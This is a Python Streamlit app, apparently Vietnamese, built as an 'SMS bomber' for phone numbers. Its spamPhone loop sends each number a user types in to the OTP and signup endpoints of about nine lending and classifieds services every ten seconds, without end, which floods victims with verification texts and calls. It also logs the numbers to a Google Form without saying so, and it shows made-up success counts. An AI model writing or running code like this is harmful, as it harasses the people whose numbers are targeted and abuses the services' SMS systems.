import streamlit as st
from streamlit.report_thread import add_report_ctx
import streamlit.components.v1 as components
import threading
from time import sleep
import requests
from PIL import Image
import time
class App:
    def __init__(self):
        st.title("Spam Số Điện Thoại By Thầy Trường")
        self.initCSS()
        self.message=""
    def initCSS(self):
        css = '''
        <style>
        div[data-testid="stToolbar"],
        div[data-testid="stReportViewContainer"]>section>footer
        {
            display:none;
        }

        </style>
        '''
        st.markdown(css, unsafe_allow_html=True)
    def buttonCSS(self):
        # response = requests.get("https://d25tv1xepz39hi.cloudfront.net/2016-01-31/files/1045.jpg")
        # img = Image.open(BytesIO(response.content))
        # st.image(img,use_column_width=True)
        css = '''
        <style>
        button[class="css-ns78wr edgvbvh1"]{
            display:none;
        }
        </style>
        '''
        """
        .stApp {
        background-color: black;
        background-size: contain;
        background-repeat: no-repeat;
        background-attachment: scroll;
        }
        div[data-testid="stMetricValue"],
        div[data-testid="stMarkdownContainer"]>h1>div>span,
        label[data-testid="stMetricLabel"]>div,
        label[class="css-qrbaxs effi0qh0"],
        div[data-testid="stMarkdownContainer"]>small>p,
        label
        {
            color:white;
        }
        svg[class="icon"]{
            stroke:rgb(255 255 255 / 100%);
        }
        svg[class="icon"]:hover{
            stroke:rgb(255 255 255 / 80%);
        }"""
        st.markdown(css, unsafe_allow_html=True)
    def javaScript(self):
        script = '''
        <script language="javascript">
            alert("hong được đâu pé ơi !!! :)))")
        </script>
        '''
        components.html(script)
        st.markdown(script, unsafe_allow_html=True)
    def spamPhone(self,arrPhone):
        sdt = arrPhone.split(",")
        i=0
        while True:
            try:
                phone = sdt[i]
                pload = {"mobilePhone":phone,"password":"R2mpP2.EdLS#i5","passwordConfirmation":"R2mpP2.EdLS#i5","isVoiceSms":True}
                requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode",json=pload)
                pload = {"name":"Tu Le Dang","phoneNumber":phone}
                requests.post("https://webvay.vn/po/api/signup/sendOtp",json = pload)
                pload = {"mobile":phone}
                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data = pload)
                pload = {"phoneNumber": phone}
                requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/",data=pload)
                pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":"","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"201","appName":"Vay Tia Chớp","packageName":"com.firstvay.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634575899216","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"Ie9ja"}}
                requests.post("https://api.first-vay.com/pdl-abroad-main/app/member/sendSmsCode",json=pload)
                pload = {"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":None,"termSysVersion":"10","termModel":"","brand":"","termId":None,"appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":None,"lat":None},"bizType":"0000","appName":"Vi May Man","packageName":"com.vimaymanvn.h5","screenResolution":"1920,1080"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1634576326968","bizParams":{"phoneNum":phone,"code":None,"type":200,"channelCode":"3Wr7a"}}
                requests.post("https://api.vmayman.com/app/member/sendSmsCode",json=pload)
                pload = {"mobile": phone}
                requests.post("https://wenvey.com/_api/auth/login/sms",data=pload)
                pload = {"phone":phone}
                requests.post("https://gateway.chotot.com/v2/public/auth/send_otp_verify",json=pload)
                pload = {"mobile": phone}
                requests.post("https://api.magpiecredit.com/user/sendCode-h5",data=pload)   
                i+=1
                if i==len(sdt):
                    i=0
            except:
                st.error("Lỗi 1 phát... Nhưng Đừng Lo Nha Pé!")
            sleep(10)
    def runThreadSpam(self,arrPhone):
        thread = threading.Thread(target=self.spamPhone,args=(arrPhone,))
        add_report_ctx(thread)
        thread.start()
    def savePhone(self,phone):
        data = {
        "entry.1826012699": phone
        }
        requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdhLpU6k8D2mPFvLNBqVGWks5qq6ZbczgJO1z0DKJkLKnXVNA/formResponse",data=data)
    def run(self):
        mobile_number=st.text_input("Nhập số điện thoại: ",help= "Nếu nhiều sdt thì ngăn cách nhau bởi dấu phẩy")
        col1, col2, col3 = st.columns(3)
        sumSpam = int(time.time())
        success = sumSpam-(sumSpam//(sumSpam%999))
        error = sumSpam - success
        percentSuccess = round(success/sumSpam,4)*100
        percentError = round(error/sumSpam,4)*100
        col1.metric("Số Lượt Spam", str(sumSpam), "1.5")
        col2.metric("Thành Công", str(success), str(percentSuccess)+"%")
        col3.metric("Thất Bại", str(error), "-"+str(percentError)+"%")
        linkContact = '[Liên Hệ Thầy Trường](https://facebook.com/100029031824085)'
        st.markdown(linkContact, unsafe_allow_html=True)
        if st.button("Xiên nuôn",help= "Nhấn vào để xiên"):
            self.buttonCSS()
            self.savePhone(mobile_number)
            # self.javaScript()
            checkPhone = True
            nono=["jkdfjds"]#['0345382198','345382198','+84345382198','0964017787','964017787','+84964017787']
            for i in nono:
                if i in mobile_number:
                    checkPhone = False
                    break
            if checkPhone:
                st.caption('Đang xiên...')
                self.runThreadSpam(mobile_number)
                st.success("Tới Công Chuyện Lun Pé Owi :))")
                img = Image.open("tu.jpg")
                st.image(img,use_column_width=True)
            else:
                self.javaScript()
if __name__=="__main__":
    App().run()
